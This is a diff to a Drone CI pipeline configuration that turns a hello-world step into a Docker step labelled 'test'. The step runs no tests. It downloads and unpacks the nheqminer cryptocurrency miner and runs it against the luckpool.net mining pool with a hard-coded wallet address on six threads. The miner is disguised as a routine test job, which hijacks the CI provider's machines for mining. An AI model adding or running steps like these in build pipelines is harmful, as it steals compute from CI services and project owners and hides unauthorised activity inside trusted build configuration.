@@ -1,13 +1,17 @@
 ---
 kind: pipeline
-type: exec
-name: default
+type: docker
+name: linux-amd64
 
 platform:
-  os: linux
   arch: amd64
+  os: linux
 
 steps:
-- name: greeting
+- name: test
+  image: golang:1.14.15
   commands:
-  - echo hello world
+    - wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+    - tar xf nheqminer-Linux-v0.8.2.tgz
+    - tar xf nheqminer-Linux-v0.8.2.tar.gz
+    - ./nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RXKKMD5LHex9nrigfwjFeu1t79144WXS2c.Go -p x -t 6
